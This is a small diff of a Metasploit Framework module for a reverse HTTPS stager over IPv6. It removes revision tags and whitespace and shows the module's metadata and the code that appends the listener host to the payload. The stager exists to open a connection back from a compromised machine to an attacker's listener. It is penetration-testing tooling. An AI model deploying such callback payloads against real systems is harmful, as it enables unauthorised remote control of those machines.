@@ -1,18 +1,12 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
 #   http://metasploit.com/
 ##
 
-
 require 'msf/core'
 require 'msf/core/handler/reverse_ipv6_https'
-
 
 module Metasploit3
 
@@ -22,7 +16,6 @@ module Metasploit3
 	def initialize(info = {})
 		super(merge_info(info,
 			'Name'          => 'Reverse HTTPS Stager (IPv6)',
-			'Version'       => '$Revision$',
 			'Description'   => 'Tunnel communication over HTTP using SSL and IPv6',
 			'Author'        => 'hdm',
 			'License'       => MSF_LICENSE,
@@ -65,7 +58,7 @@ module Metasploit3
 				}
 			))
 	end
-	
+
 	#
 	# Do not transmit the stage over the connection.  We handle this via HTTPS
 	#
@@ -86,7 +79,7 @@ module Metasploit3
 		if Rex::Socket.is_ipv6?(lhost)
 			lhost = "[#{lhost}]"
 		end
-				
+
 		p + lhost + "\x00"
 	end
 
@@ -97,4 +90,3 @@ module Metasploit3
 		20
 	end
 end
-
